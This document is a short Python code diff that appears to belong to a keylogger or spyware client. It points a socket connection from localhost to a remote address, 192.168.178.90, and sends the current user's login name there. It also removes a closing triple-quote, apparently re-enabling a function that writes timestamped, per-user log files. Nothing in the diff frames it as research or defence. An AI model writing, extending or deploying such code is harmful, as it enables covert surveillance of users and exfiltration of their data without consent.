@@ -6,7 +6,7 @@ import getpass
 import socket
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
-server_address = ('localhost', 12345)
+server_address = ('192.168.178.90', 12345)
 client_socket.connect(server_address)
 client_socket.sendall(str(getpass.getuser()).encode())
 
@@ -48,7 +48,7 @@ def writeToFileHuman(lPath, lName, strh):
 
         newLog = open(lPath + lName, "a")
         newLog.write(strh)
-        newLog.close()"""
+        newLog.close()
 
 def main():
     tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
